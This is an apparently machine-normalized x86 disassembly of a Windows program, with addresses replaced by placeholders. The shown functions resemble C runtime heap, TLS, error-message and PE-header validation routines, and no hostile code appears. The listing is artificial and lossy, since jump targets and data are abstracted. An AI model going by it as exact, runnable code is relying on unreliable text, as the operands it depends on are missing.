mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_4095a4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_4096ac
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_40998d
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_4095a4
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_4094f4
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_409c81
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_40a4c8
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_409ca9
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_409cd9
mov edi edi
push ebp
mov ebp esp
call sub_40a18c
push [ ebp + 0x8 ]
call sub_409fe1
push [ rw-data ]
call sub_40a4c8
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_409d02
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_409d57
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_409d74
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_409d98
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c382
push r--data
push r--data
call sub_409d74
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_40a390
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_40b20b
call sub_405612
mov eax r--data
mov [ esp ] r--data
call sub_409d57
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
xor eax eax
push rw-data
call sub_40a390
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_409e1d
push 0x18
push r--data
call sub_405254
push 0x8
call sub_40917b
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409f34
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_405299
retn
mov [ rw-data ] ebx
push 0x8
call sub_4090a1
pop ecx
push [ ebp + 0x8 ]
call sub_409d2d
push r--data
mov eax r--data
call sub_409d57
pop ecx
push [ rw-data ]
call sub_40a4c8
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_409d57
pop ecx
push [ rw-data ]
call sub_40a4c8
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_40a4bf
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_40a4c8
mov edi eax
call sub_40a4bf
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_40a4c8
mov edi eax
push [ rw-data ]
call sub_40a4c8
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_409f93
mov edi edi
push esi
call sub_40a4bf
mov esi eax
push esi
call sub_409c72
push esi
call sub_40b90b
push esi
call sub_405b07
push esi
call sub_40d8b0
push esi
call sub_40d8a1
push esi
call sub_40d68f
push esi
call sub_401000
push esi
call sub_40d67e
push sub_409f5f
call sub_40a44d
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_409fe1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_40dbb9
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_40dbb9
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_405460
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_40db51
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_405b16
add esp 0x14
push esi
call sub_405460
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_40db51
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_405460
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_40da9c
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_405b16
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_40da28
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_405b16
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_405b16
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_40d8bf
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_405b16
add esp 0x14
push r--data
push ebx
push edi
call sub_40da28
add esp 0xc
test eax eax
je r-xdata
sub_40a18c
push 0x3
call sub_40dbb9
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_409fe1
push 0xff
call sub_409fe1
pop ecx
pop ecx
push 0x3
call sub_40dbb9
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40a1e2
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_405460
mov edi eax
inc edi
push edi
call sub_4050ad
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_40db51
add esp 0xc
jmp r-xdata
sub_40a262
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40a23f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_405177
pop ecx
sub_40a293
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40a283
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_405177
pop ecx
sub_40a2b4
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_40a300
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_40a340
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40a390
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_4052b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_40a300
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_40a340
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a44d
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_409ca9
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1f8 ]
jmp r-xdata
test eax eax
je r-xdata
sub_40a4c8
mov edi edi
push ebp
mov ebp esp
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
push esi
call sub_409ca9
pop ecx
test eax eax
je r-xdata
push eax
push [ rw-data ]
call esi
call eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
call eax
mov [ ebp + 0x8 ] eax
mov eax [ eax + 0x1fc ]
jmp r-xdata
test eax eax
je r-xdata
sub_40a543
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call sub_40a4c8
pop ecx
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_40a577
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call sub_40a4c8
pop ecx
call eax
or [ rw-data ] 0xffffffff
jmp sub_40904a
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_40a5b4
push 0xc
push r--data
call sub_405254
mov esi r--data
push esi
call [ GetModuleHandleW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
test eax eax
je r-xdata
push esi
call sub_409ca9
pop ecx
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_40917b
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a689
push 0xc
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push r--data
push eax
